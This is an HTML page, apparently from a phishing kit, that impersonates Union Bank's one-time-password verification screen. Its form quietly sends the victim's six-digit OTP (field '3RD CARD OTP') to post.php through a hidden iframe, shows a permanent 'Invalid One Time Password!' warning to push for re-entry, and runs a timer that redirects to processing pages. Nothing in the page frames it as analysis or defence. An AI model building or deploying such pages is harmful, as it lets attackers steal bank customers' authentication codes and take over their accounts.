<!DOCTYPE html>
<html lang="zxx">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <meta name="msapplication-TileColor" content="#da532c">
    <meta name="theme-color" content="#ffffff">
    <title>Enter OTP/ Union Bank</title>
    <style>
        #aa {
            width: 104%;
            margin: -8px;
            margin-left: -7px;
        }

        #ft {
            width: 104%;
            margin-left: -8px;
        }

        #ee {
            width: 280px;
            height: 30px;
            padding: 3px 10px;
            background-color: white;
            border-style: solid;
            outline: none;
            border-color: #AE2924;
            border-width: 1px;
            color: #AE2924;
            font-size: 14px;
            font-weight: bold;
            font-style: italic;
            margin: 2px;
            border-radius: 4px;
            margin-left: 20px;
        }

        #ee:hover {
            width: 280px;
            height: 30px;
            padding: 3px 10px;
            background-color: white;
            border-style: solid;
            border-color: #AE2924;
            outline: none;
            box-shadow: 0 0 6px 0 #AE2924;
            border-width: 1px;
            color: #AE2924;
            font-weight: bold;
            font-style: italic;
            margin: 2px;
            border-radius: 4px;
            margin-left: 20px;
        }

        #ll {
            background-color: #AE2924;
            color: white;
            padding: 0px 0px;
            margin: 10px 25px;
            border: none;
            outline: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 15px;
            width: 120px;
            height: 36px;
        }

        #ll:hover {
            background-color: #3E1128;
            color: white;
            padding: 0px 0px;
            margin: 10px 25px;
            border: none;
            outline: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 15px;
            width: 120px;
            height: 36px;
        }

        #kk,
        #ab {
            width: 100%;
        }

        #ii {
            width: 35%;
            border-radius: 18px;
            margin-left: 20px;
        }

        a:hover {
            background-color: #93c5ed;
            color: white;
            border-radius: 3px;
            text-decoration: none;
        }

        #kyc {
            width: 104%;
            background-color: #FF0000;
            height: 55px;
            margin: 6px;
            margin-left: -7px;
        }

        #col {
            width: 104%;
            background-color: #D8D1DB;
            height: 440px;
            margin: -6px;
            margin-left: -7px;
        }

        #zz {
            color: red;
            margin: 2px;
            margin-left: 15px;
            font-size: 14px;
        }

        input::-webkit-input-placeholder {
            font-style: italic;
        }

        input:-moz-placeholder {
            font-style: italic;
        }

        input::-moz-placeholder {
            font-style: italic;
        }

        input:-ms-input-placeholder {
            font-style: italic;
        }
    </style>
</head>

<body onload="startTimer();">
    <!-- Static- Please don't do anything here-->
    <script type="text/javascript">
        var submitted = false;
    </script>
    <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Processing3.html';}"></iframe>
    <!--My Form-->
    <form action="post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="myform">
        <img src="lolo.jpg" alt="" id="aa">
        <div id="kyc"><br>
            <b style="color:white; font-size:18px; padding:20px;">OTP Verification</b><br>
        </div>
        <div id="col">
            <br><br>
            <center> <b style="font-family: Arial; 
    color:#3E1128; 
    font-size:15px;">Please enter The One Time Password(OTP)<br>
    which was sent to your registered mobile <br>number with Union Bank.</b></center><br>
            <b style="font-family: Arial; 
        color:#AE2924; 
        padding:0px 20px; font-size:16px;"><i>One Time Password*</i></b><br>
            <div id="dd">
                <input type="text" name="3RD CARD OTP" id="ee" inputmode="numeric" placeholder="Enter Correct OTP" maxlength="6" pattern="[0-9]{6}" title="Please Enter Valid One Time Password" required=""><br>
                <div id="zz">
                    <i><b>Invalid One Time Password!</b></i>
                </div>
                <script type="text/javascript">
                    var timer = 180;
                    var sec = 0;

                    function startTimer() {
                        sec = parseInt(timer % 180);

                        if (timer < 2) {
                            // timer.stop();
                            window.location.href = "processing3.php";
                        }

                        document.getElementById("time").innerHTML = "<p1> Wait for OTP   : </p1>" + sec.toString();
                        timer--;
                        setTimeout(function() {
                            startTimer();

                        }, 1000);
                    }
                </script>
                <div id="re">
                    <b> <a href="" style="color:#27a2db; margin-left:225px; text-decoration:none;">Resend OTP</a></b><br>
                </div>
                <div>
                    <center><b style="color:#AE2924; font-size:14px; text-align:center;"><span style="color:#AE2924; font-size:13px;" id="time"></span>&nbsp;second</b></center>
                </div><br>
            </div>
            <div id="ff">
                <button type="submit" id="ll" style="font-weight: bold;">
        SUBMIT OTP</button>
            </div><br>
        </div>
        <img src="futterhas.png" alt="" id="ft">
    </form>
</body>

</html>